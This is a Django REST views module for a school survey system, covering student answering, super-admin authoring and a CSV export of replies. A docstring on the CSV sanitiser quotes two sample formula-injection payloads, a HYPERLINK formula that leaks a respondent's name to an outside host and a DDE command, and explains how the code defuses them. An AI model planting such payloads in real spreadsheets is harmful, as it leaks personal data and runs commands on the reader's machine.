"""Survey API.

Student:
  GET  /api/surveys/open/            surveys I may still answer
  GET  /api/surveys/<id>/            the form (published + in-window only)
  POST /api/surveys/<id>/respond/    { answers: { "<question_id>": value, … } }
Authoring (super_admin ONLY):
  GET/POST         /api/surveys/admin/
  GET/PATCH/DELETE /api/surveys/admin/<id>/
  POST/PATCH/DELETE /api/surveys/admin/<id>/questions/[<qid>/]
  POST             /api/surveys/admin/<id>/questions/reorder/
  GET              /api/surveys/admin/<id>/responses/       summaries + individual replies
  GET              /api/surveys/admin/<id>/responses.csv    the same data as a spreadsheet

Authoring is restricted to super_admin by the school's explicit instruction. It is enforced
here, on every authoring endpoint, and not merely by hiding the ops page: the codebase has no
per-nav-item role gating, so the page gate alone would be decoration.
"""

from __future__ import annotations

import csv

from django.core.exceptions import ValidationError
from django.db import transaction
from django.db.models import Count, Q
from django.http import HttpResponse
from django.shortcuts import get_object_or_404
from django.utils.text import slugify
from rest_framework import status as http
from rest_framework.parsers import FormParser, JSONParser, MultiPartParser
from rest_framework.permissions import IsAuthenticated
from rest_framework.response import Response
from rest_framework.views import APIView

from access import constants as acc_const
from access.services import normalized_role

from . import services
from .models import Survey, SurveyQuestion, SurveyResponse
from .serializers import (
    SurveyBriefSerializer,
    SurveyQuestionSerializer,
    SurveyResponseSerializer,
    SurveySerializer,
)


#: Characters that make a spreadsheet treat a cell as a FORMULA rather than as text.
_CSV_FORMULA_LEADERS = ("=", "+", "-", "@", "\t", "\r")


def _csv_safe(value: str) -> str:
    """One cell, with any formula it might have been read as defused.

    Survey answers are written by students and read in Excel. A reply of
    ``=HYPERLINK("https://elsewhere/?d="&B2,"Results")`` is a live link in the downloaded
    file that carries the neighbouring cell — the respondent's NAME — off-site when an
    administrator clicks it. ``=cmd|'/c calc'!A1`` is the same shape pointed at DDE.

    The fix is the standard one: a leading apostrophe, which Excel and LibreOffice both eat
    while displaying the rest verbatim. Applied to prompts too, because an author writes
    those and they land in the header row.
    """
    text = "" if value is None else str(value)
    return f"'{text}" if text.startswith(_CSV_FORMULA_LEADERS) else text


def _is_super_admin(user) -> bool:
    return bool(getattr(user, "is_superuser", False)) or (
        normalized_role(user) == acc_const.ROLE_SUPER_ADMIN
    )


class _AuthoringView(APIView):
    """Base for every authoring endpoint. super_admin only, checked on each request."""

    permission_classes = [IsAuthenticated]
    # A survey and a question can each carry a picture, so every authoring endpoint has to
    # accept multipart as well as JSON. Declared on the base rather than on the two views
    # that take a file today: the alternative is a 415 the first time somebody attaches an
    # image to an endpoint nobody remembered to widen.
    parser_classes = [MultiPartParser, FormParser, JSONParser]

    def _guard(self, request):
        if _is_super_admin(request.user):
            return None
        return Response(
            {"detail": "Only a super admin can manage surveys."}, status=http.HTTP_403_FORBIDDEN
        )


# ── Student ───────────────────────────────────────────────────────────────────

class OpenSurveysView(APIView):
    permission_classes = [IsAuthenticated]

    def get(self, request):
        surveys = services.open_surveys_for(request.user)
        return Response({
            "surveys": SurveyBriefSerializer(
                surveys, many=True, context={"request": request}
            ).data
        })


class SurveyDetailView(APIView):
    """The form itself. A draft is invisible even by direct id — otherwise its author could
    hand the link around and mint points from an unpublished survey."""

    permission_classes = [IsAuthenticated]

    def get(self, request, survey_id):
        survey = get_object_or_404(Survey, pk=survey_id)
        if not survey.is_open() and not _is_super_admin(request.user):
            return Response({"detail": "That survey is not open."}, status=http.HTTP_404_NOT_FOUND)
        already = SurveyResponse.objects.filter(
            survey=survey, student=request.user, status=SurveyResponse.STATUS_SUBMITTED
        ).exists()
        data = SurveySerializer(survey, context={"request": request}).data
        data["already_completed"] = already
        return Response(data)


class SurveyRespondView(APIView):
    permission_classes = [IsAuthenticated]

    def post(self, request, survey_id):
        survey = get_object_or_404(Survey, pk=survey_id)
        answers = request.data.get("answers")
        if not isinstance(answers, dict):
            return Response({"detail": "answers must be an object keyed by question id."}, status=400)
        try:
            response = services.submit_response(
                survey,
                request.user,
                answers,
                follow_ups=request.data.get("follow_ups"),
                anonymous=bool(request.data.get("anonymous")),
            )
        except ValidationError as exc:
            return Response({"detail": "; ".join(exc.messages)}, status=400)
        return Response(
            {
                "detail": "Thanks — your answers are recorded.",
                "response_id": response.id,
                # Echoed back so the thank-you card can state what was actually recorded,
                # rather than repeating what the student asked for. The two differ when a
                # survey's author never turned anonymity on.
                "is_anonymous": response.is_anonymous,
            },
            status=http.HTTP_201_CREATED,
        )


# ── Authoring (super_admin) ───────────────────────────────────────────────────

class SurveyAdminListView(_AuthoringView):
    def get(self, request):
        denied = self._guard(request)
        if denied:
            return denied
        # Prefetched + annotated: the serializer reads both counts off these rather than
        # firing two COUNTs per survey (the console lists every survey the school has).
        surveys = Survey.objects.prefetch_related("questions").annotate(
            submitted_count=Count(
                "responses", filter=Q(responses__status=SurveyResponse.STATUS_SUBMITTED)
            )
        )
        return Response({
            "surveys": SurveySerializer(
                surveys, many=True, context={"request": request}
            ).data
        })

    def post(self, request):
        denied = self._guard(request)
        if denied:
            return denied
        serializer = SurveySerializer(data=request.data)
        serializer.is_valid(raise_exception=True)
        survey = serializer.save(created_by=request.user)
        return Response(
            SurveySerializer(survey, context={"request": request}).data,
            status=http.HTTP_201_CREATED,
        )


class SurveyAdminDetailView(_AuthoringView):
    def get(self, request, survey_id):
        denied = self._guard(request)
        if denied:
            return denied
        return Response(
            SurveySerializer(
                get_object_or_404(Survey, pk=survey_id), context={"request": request}
            ).data
        )

    def patch(self, request, survey_id):
        denied = self._guard(request)
        if denied:
            return denied
        survey = get_object_or_404(Survey, pk=survey_id)
        # Publishing an empty form would show students a survey with nothing to answer and no
        # way to earn from it.
        wants_publish = str(request.data.get("status") or "") == Survey.STATUS_PUBLISHED
        if wants_publish and not survey.questions.exists():
            return Response(
                {"detail": "Add at least one question before publishing."}, status=400
            )
        serializer = SurveySerializer(
            survey, data=request.data, partial=True, context={"request": request}
        )
        serializer.is_valid(raise_exception=True)
        return Response(SurveySerializer(serializer.save(), context={"request": request}).data)

    def delete(self, request, survey_id):
        denied = self._guard(request)
        if denied:
            return denied
        survey = get_object_or_404(Survey, pk=survey_id)
        if survey.responses.filter(status=SurveyResponse.STATUS_SUBMITTED).exists():
            # Deleting would cascade the responses away, and with them the evidence behind
            # every 40-point award the survey paid.
            return Response(
                {"detail": "That survey has responses. Close it instead of deleting it."},
                status=400,
            )
        survey.delete()
        return Response(status=http.HTTP_204_NO_CONTENT)


class SurveyQuestionsView(_AuthoringView):
    def post(self, request, survey_id):
        denied = self._guard(request)
        if denied:
            return denied
        survey = get_object_or_404(Survey, pk=survey_id)
        # The order is settled BEFORE validation, not after. A display condition may only
        # point at an earlier question, and the serializer checks that against `order` — on a
        # create that field is not in the payload, so validating first meant the rule was
        # skipped for exactly the questions most likely to break it.
        order = request.data.get("order")
        if order in (None, ""):
            last = survey.questions.order_by("-order").first()
            order = (last.order + 1) if last else 0
        payload = {**request.data.dict()} if hasattr(request.data, "dict") else {**request.data}
        payload["order"] = int(order)
        serializer = SurveyQuestionSerializer(
            data=payload, context={"request": request, "survey": survey}
        )
        serializer.is_valid(raise_exception=True)
        question = serializer.save(survey=survey, order=int(order))
        return Response(
            SurveyQuestionSerializer(question, context={"request": request}).data,
            status=http.HTTP_201_CREATED,
        )


class SurveyQuestionDetailView(_AuthoringView):
    def patch(self, request, survey_id, question_id):
        denied = self._guard(request)
        if denied:
            return denied
        question = get_object_or_404(SurveyQuestion, pk=question_id, survey_id=survey_id)
        serializer = SurveyQuestionSerializer(
            question,
            data=request.data,
            partial=True,
            context={"request": request, "survey": question.survey},
        )
        serializer.is_valid(raise_exception=True)
        return Response(
            SurveyQuestionSerializer(serializer.save(), context={"request": request}).data
        )

    def delete(self, request, survey_id, question_id):
        denied = self._guard(request)
        if denied:
            return denied
        question = get_object_or_404(SurveyQuestion, pk=question_id, survey_id=survey_id)
        question.delete()
        return Response(status=http.HTTP_204_NO_CONTENT)


class SurveyQuestionReorderView(_AuthoringView):
    """``{"order": [<question_id>, …]}`` — the questions in their new sequence.

    One request for the whole list rather than a PATCH per moved question. Dragging one
    question to the top renumbers every question below it; sending those one at a time leaves
    the survey in a half-renumbered state for as long as the requests are in flight, and
    leaves it there permanently if one of them fails.
    """

    @transaction.atomic
    def post(self, request, survey_id):
        denied = self._guard(request)
        if denied:
            return denied
        survey = get_object_or_404(Survey, pk=survey_id)
        raw = request.data.get("order")
        if not isinstance(raw, list):
            return Response({"detail": "order must be a list of question ids."}, status=400)
        try:
            wanted = [int(x) for x in raw]
        except (TypeError, ValueError):
            return Response({"detail": "order must be a list of question ids."}, status=400)

        questions = {q.id: q for q in survey.questions.select_for_update()}
        if set(wanted) != set(questions):
            # A partial list would silently drop whatever it omitted to the end of the form.
            # Refusing is the safe answer: the client is out of date and should refetch.
            return Response(
                {"detail": "That ordering does not match this survey's questions."}, status=400
            )

        # A display condition may only point BACKWARDS. Dragging a question above the one it
        # depends on would break that in a way nothing downstream could recover from: the
        # single-pass evaluator would read the source answer before it existed and silently
        # treat the question as hidden for everybody. Refused, naming both questions, rather
        # than accepted-and-quietly-broken or accepted-and-condition-cleared — the author
        # moved something on purpose and is owed the reason it did not stick.
        position_of = {qid: i for i, qid in enumerate(wanted)}
        for question in questions.values():
            if not question.condition_question_id:
                continue
            source_at = position_of.get(question.condition_question_id)
            if source_at is None:
                continue
            if source_at >= position_of[question.id]:
                source = questions[question.condition_question_id]
                return Response(
                    {
                        "detail": (
                            f"“{question.prompt}” is only shown depending on "
                            f"“{source.prompt}”, so it has to stay below it. "
                            "Move that question first, or clear the rule."
                        )
                    },
                    status=400,
                )

        for position, question_id in enumerate(wanted):
            question = questions[question_id]
            if question.order != position:
                question.order = position
                question.save(update_fields=["order"])
        return Response({
            "questions": SurveyQuestionSerializer(
                survey.questions.all(), many=True, context={"request": request}
            ).data
        })


class SurveyResponsesView(_AuthoringView):
    """Everything the console needs to read a survey: the shape of the answers, then the
    answers themselves.

    ``summaries`` first because that is how results are actually read — "what did the school
    say" before "what did this student say". The old response served only the raw list, which
    left a reader of a 200-reply multiple-choice question counting rows by eye.
    """

    def get(self, request, survey_id):
        denied = self._guard(request)
        if denied:
            return denied
        survey = get_object_or_404(Survey, pk=survey_id)
        results = services.survey_results(survey)
        return Response({
            "survey": SurveyBriefSerializer(survey, context={"request": request}).data,
            "summaries": results["summaries"],
            "responses": SurveyResponseSerializer(results["responses"], many=True).data,
        })


class SurveyResponsesCsvView(_AuthoringView):
    """The same replies as a spreadsheet — one row per response, one column per question.

    Wide rather than long (a row per answer) because the school reads these in Excel and
    wants one line per person. A question that opened a follow-up gets a second column so the
    comment stays beside the score it explains rather than being pasted into the same cell.
    """

    def get(self, request, survey_id):
        denied = self._guard(request)
        if denied:
            return denied
        survey = get_object_or_404(Survey, pk=survey_id)
        questions = list(survey.questions.all())
        results = services.survey_results(survey)

        response = HttpResponse(content_type="text/csv; charset=utf-8")
        name = slugify(survey.title) or f"survey-{survey.pk}"
        response["Content-Disposition"] = f'attachment; filename="{name}-replies.csv"'
        # Excel reads a bare UTF-8 CSV as latin-1 and turns every non-ASCII name into
        # mojibake. The BOM is what tells it otherwise.
        response.write("\ufeff")

        # A column is emitted when the question is CONFIGURED to collect comments, or when
        # any stored answer actually carries one. The second half matters: an author who
        # clears the threshold after the replies are in would otherwise silently drop every
        # comment already collected from the export, with nothing saying they existed.
        answered_with_comment = {
            a.question_id
            for r in results["responses"]
            for a in r.answers.all()
            if (a.follow_up or "").strip()
        }
        wants_comment = {
            q.id
            for q in questions
            if q.follow_up_threshold is not None
            or q.follow_up_options
            or q.id in answered_with_comment
        }

        writer = csv.writer(response)
        header = ["Submitted at", "Student"]
        for q in questions:
            header.append(_csv_safe(q.prompt))
            if q.id in wants_comment:
                header.append(_csv_safe(f"{q.prompt} — comment"))
        writer.writerow(header)

        for r in results["responses"]:
            by_question = {a.question_id: a for a in r.answers.all()}
            row = [
                r.submitted_at.isoformat() if r.submitted_at else "",
                _csv_safe(
                    "Anonymous" if r.is_anonymous
                    else SurveyResponseSerializer().get_student_name(r)
                ),
            ]
            for q in questions:
                answer = by_question.get(q.id)
                value = answer.value if answer else None
                row.append(
                    _csv_safe(
                        "" if value is None
                        else ", ".join(str(v) for v in value) if isinstance(value, list)
                        else str(value)
                    )
                )
                if q.id in wants_comment:
                    row.append(_csv_safe(answer.follow_up if answer else ""))
            writer.writerow(row)
        return response
